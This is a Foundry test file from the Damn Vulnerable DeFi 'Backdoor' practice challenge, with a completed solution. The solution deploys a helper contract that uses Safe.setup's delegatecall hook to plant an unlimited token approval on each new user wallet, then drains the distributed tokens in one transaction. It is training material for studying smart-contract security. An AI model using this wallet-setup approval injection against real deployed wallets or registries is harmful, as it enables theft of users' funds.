// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // Bug: Safe.setup() accepts (to, data) for delegatecall. We can inject
        // an approval to ourselves INSIDE setup — the Safe ends up approving
        // our helper as spender of the DVT it's about to receive.
        // Single-tx constraint: deploy helper that loops all 4 users.
        new BackdoorExploit(users, singletonCopy, walletFactory, walletRegistry, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract ApprovalInjector {
    // This runs as delegatecall inside Safe.setup — so `address(this)` = Safe,
    // msg.sender in the inner call is Safe itself.
    function approveAll(address token, address spender) external {
        DamnValuableToken(token).approve(spender, type(uint256).max);
    }
}

contract BackdoorExploit {
    constructor(
        address[] memory users,
        Safe singleton,
        SafeProxyFactory factory,
        WalletRegistry registry,
        DamnValuableToken token,
        address recovery
    ) {
        ApprovalInjector injector = new ApprovalInjector();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // delegatecall payload: injector.approveAll(token, this)
            bytes memory approvalData = abi.encodeWithSelector(
                ApprovalInjector.approveAll.selector,
                address(token),
                address(this)
            );

            // Safe.setup calldata
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,           // owners[]
                uint256(1),       // threshold
                address(injector),// to (delegatecall target)
                approvalData,     // data
                address(0),       // fallbackHandler
                address(0),       // paymentToken
                uint256(0),       // payment
                address(0)        // paymentReceiver
            );

            // Factory creates proxy → registry gets called → registry transfers 10 DVT to wallet
            address wallet = address(factory.createProxyWithCallback(
                address(singleton), initializer, 0, registry
            ));

            // Pull the 10 DVT (we're approved via setup delegatecall)
            token.transferFrom(wallet, recovery, 10e18);
        }
    }
}
